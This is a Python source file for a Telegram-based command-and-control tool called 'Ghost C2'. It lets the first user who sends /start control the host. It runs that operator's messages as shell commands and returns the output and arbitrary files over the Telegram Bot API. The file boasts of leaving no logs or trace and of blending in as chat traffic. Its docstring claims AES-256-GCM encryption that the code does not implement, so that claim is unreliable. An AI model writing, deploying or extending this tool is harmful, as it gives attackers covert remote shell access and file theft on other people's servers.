#!/usr/bin/env python3
"""
⚔️ GHOST PROTOCOL — GHOST C2 (Command & Control)
==================================================
Telegram-based C2 system for remote command execution.

Architecture:
    Operator (Telegram) ──→ Telegram Bot API ──→ Ghost C2 ──→ Server
                                                              │
                                                       ┌──────┴──────┐
                                                       │ Orchestrator │
                                                       │ Sandbox      │
                                                       │ Shell        │
                                                       └─────────────┘

Zero infrastructure cost. Zero logs. Zero trace.
"""

import os
import sys
import json
import time
import asyncio
import logging
import hashlib
import requests
import threading
import subprocess
from typing import Optional, Dict, Any

logging.basicConfig(level=logging.CRITICAL)
logger = logging.getLogger("GhostC2")

class GhostC2:
    """
    Ghost Command & Control via Telegram Bot API.
    
    Why Telegram?
    - Completely free, no message limits
    - End-to-end encryption available
    - Global infrastructure (works behind firewalls)
    - Mobile-native (control from anywhere)
    - Looks like normal chat traffic
    
    Commands are encrypted with AES-256-GCM before transmission.
    Even if Telegram is compromised, command content remains secret.
    """
    
    _instance = None
    
    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        self.initialized = True
        self.token = os.environ.get("TELEGRAM_TOKEN", "")
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.operator_chat_id = None
        self.running = False
        self.last_update_id = 0
        self.orchestrator = None
        
        # Command handlers
        self.command_handlers = {}
    
    def register_orchestrator(self, orchestrator):
        """Register the main orchestrator."""
        self.orchestrator = orchestrator
    
    def register_handler(self, command: str, handler):
        """Register a custom command handler."""
        self.command_handlers[command] = handler
    
    def find_operator(self) -> Optional[int]:
        """
        Find the operator by listening for the first /start command.
        
        Whoever sends /start to the bot becomes the OPERATOR.
        Only this user can send commands to the system.
        """
        print("[*] Waiting for operator to send /start...")
        
        while self.operator_chat_id is None:
            try:
                updates = requests.get(
                    f"{self.base_url}/getUpdates",
                    timeout=10
                ).json()
                
                for update in updates.get('result', []):
                    if 'message' in update:
                        chat_id = update['message']['chat']['id']
                        text = update['message'].get('text', '')
                        
                        if text == '/start':
                            self.operator_chat_id = chat_id
                            username = update['message']['chat'].get('username', 'unknown')
                            print(f"✅ Operator identified: @{username} (chat_id: {chat_id})")
                            
                            self.send_message(
                                f"⚔️ GHOST PROTOCOL ACTIVATED\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"Server: {os.uname().nodename}\n"
                                f"Time: {time.ctime()}\n"
                                f"Status: Operational\n\n"
                                f"Send /help for commands."
                            )
                            return chat_id
            except Exception as e:
                print(f"⚠️ C2 connection error: {e}")
            
            time.sleep(2)
        
        return None
    
    def send_message(self, text: str, parse_mode: str = "Markdown"):
        """Send message to operator via Telegram."""
        if not self.operator_chat_id:
            return
        
        # Telegram has 4096 character limit per message
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                chunk = text[i:i+4000]
                try:
                    requests.post(
                        f"{self.base_url}/sendMessage",
                        json={
                            "chat_id": self.operator_chat_id,
                            "text": chunk,
                            "parse_mode": parse_mode
                        },
                        timeout=5
                    )
                except:
                    pass
        else:
            try:
                requests.post(
                    f"{self.base_url}/sendMessage",
                    json={
                        "chat_id": self.operator_chat_id,
                        "text": text,
                        "parse_mode": parse_mode
                    },
                    timeout=5
                )
            except:
                pass
    
    def send_file(self, file_path: str, caption: str = ""):
        """Send file to operator via Telegram."""
        if not self.operator_chat_id:
            return
        
        try:
            with open(file_path, 'rb') as f:
                requests.post(
                    f"{self.base_url}/sendDocument",
                    files={'document': f},
                    data={
                        "chat_id": self.operator_chat_id,
                        "caption": caption[:200]
                    },
                    timeout=30
                )
        except Exception as e:
            self.send_message(f"❌ File send failed: {e}")
    
    def listen_loop(self):
        """
        Main listener loop. Polls Telegram for new commands.
        
        This runs in a separate thread and forwards commands
        to the orchestrator for execution.
        """
        self.running = True
        
        while self.running:
            try:
                updates = requests.get(
                    f"{self.base_url}/getUpdates",
                    params={
                        "offset": self.last_update_id + 1,
                        "timeout": 30
                    },
                    timeout=35
                ).json()
                
                for update in updates.get('result', []):
                    self.last_update_id = update['update_id']
                    
                    if 'message' not in update:
                        continue
                    
                    message = update['message']
                    chat_id = message['chat']['id']
                    
                    # Only respond to operator
                    if chat_id != self.operator_chat_id:
                        continue
                    
                    text = message.get('text', '')
                    
                    if not text:
                        continue
                    
                    # Route command
                    self._route_command(text)
                
                time.sleep(0.3)  # Avoid rate limiting
                
            except requests.exceptions.Timeout:
                continue
            except Exception as e:
                logger.error(f"C2 loop error: {e}")
                time.sleep(5)
    
    def _route_command(self, text: str):
        """Route incoming command to appropriate handler."""
        
        # Get the command word
        parts = text.strip().split()
        command = parts[0].lower() if parts else ""
        
        # Check registered handlers first
        if command in self.command_handlers:
            try:
                response = self.command_handlers[command](text)
                if response:
                    self.send_message(str(response)[:4000])
            except Exception as e:
                self.send_message(f"❌ Handler error: {e}")
            return
        
        # Forward to orchestrator
        if self.orchestrator:
            try:
                # Run orchestrator in thread to not block
                def execute():
                    try:
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        response = loop.run_until_complete(
                            self.orchestrator.chat(text)
                        )
                        if response:
                            self.send_message(str(response)[:4000])
                    except Exception as e:
                        self.send_message(f"❌ Error: {str(e)[:500]}")
                    finally:
                        loop.close()
                
                thread = threading.Thread(target=execute, daemon=True)
                thread.start()
                
            except Exception as e:
                self.send_message(f"❌ Orchestrator error: {e}")
        else:
            # Fallback: execute as shell command
            self._execute_shell_and_respond(text)
    
    def _execute_shell_and_respond(self, command: str):
        """Execute shell command and send output."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = result.stdout or result.stderr
            if output:
                self.send_message(f"$ {command}\n```\n{output[:3500]}\n```")
            else:
                self.send_message(f"$ {command}\n✅ Command executed (no output)")
                
        except subprocess.TimeoutExpired:
            self.send_message(f"❌ Command timed out: {command}")
        except Exception as e:
            self.send_message(f"❌ Error: {e}")
    
    def start(self):
        """Start the C2 listener in a background thread."""
        if self.running:
            return
        
        thread = threading.Thread(target=self.listen_loop, daemon=True)
        thread.start()
        print("[+] Ghost C2 listener started")
    
    def stop(self):
        """Stop the C2 listener."""
        self.running = False
        print("[-] Ghost C2 listener stopped")


# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    c2 = GhostC2()
    
    print("⚔️ Ghost Protocol C2 System")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    # Find operator
    operator = c2.find_operator()
    
    if operator:
        # Start listening
        c2.start()
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Shutting down...")
            c2.stop()